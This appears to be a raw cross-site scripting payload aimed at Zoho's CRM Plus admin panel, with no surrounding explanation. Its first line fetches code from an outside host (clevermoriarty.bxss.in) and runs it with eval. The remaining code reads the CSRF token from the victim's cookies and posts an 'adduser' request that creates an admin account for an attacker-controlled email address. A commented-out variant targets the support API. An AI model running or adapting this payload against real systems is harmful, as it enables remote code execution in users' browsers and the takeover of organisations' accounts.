function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//clevermoriarty.bxss.in");a.send();


function findCsrf(cookieName) {
	var nameEQ = cookieName + "=";
	var ca = document.cookie.split(';');
	for(var i=0;i < ca.length;i++) {
		var c = ca[i].trim();
		if (c.indexOf(nameEQ) == 0){ 
			return c.substring(nameEQ.length,c.length)
		};
	}
	return null;
}
function xhr() {
    var xmlhttp;
    if (window.XMLHttpRequest) {
	xmlhttp=new XMLHttpRequest();
    }
    else if(window.ActiveXObject) {
	try {
	    xmlhttp=new ActiveXObject("Msxml2.XMLHTTP");
	}
	catch(e) {
	    xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
	}
    }
    return xmlhttp;
}
function getPlainResponse(action, params) {
    
    var objHTTP,result;objHTTP = xhr();
    objHTTP.open('POST', action, false);
    objHTTP.setRequestHeader('Content-Type','application/x-www-form-urlencoded;charset=UTF-8');
    objHTTP.setRequestHeader('Content-length', params.length);
    objHTTP.send(params);    
    return objHTTP;
}

//var params= {"firstName":"","lastName":"clevermoriarty","associatedDepartmentIds":["4000000099140"],"rolePermissionType":"Admin","aboutInfo":"","mobile":"","phone":"","extn":"","status":"ACTIVE","emailId":"clevermoriarty@yahoo.com"}//No I18N
//var result = getPlainResponse('https://crmplus.zoho.com/supportapi/zd/zohocorp/api/v1/agents?portalname=zohocorp', JSON.stringify(params)); //No I18N 

var csrfToken = findCsrf('crmcsr');
var data = 'cmcsrfparam='+csrfToken+'&action=adduser&data={"email_id":"clevermoriarty1@yahoo.com","last_name":"clevermoriarty","apps":[{"app_name":"support","zaaid":"4241905","is_service_admin":false,"is_admin":true,"is_agent":false,"departments":[{"department_id":"4000000099140","chat_enabled":false}],"skip_no_permission":true}],"is_active":true}';
var result = getPlainResponse('https://crmplus.zoho.com/zohocorppace/adminpanel.do',data);
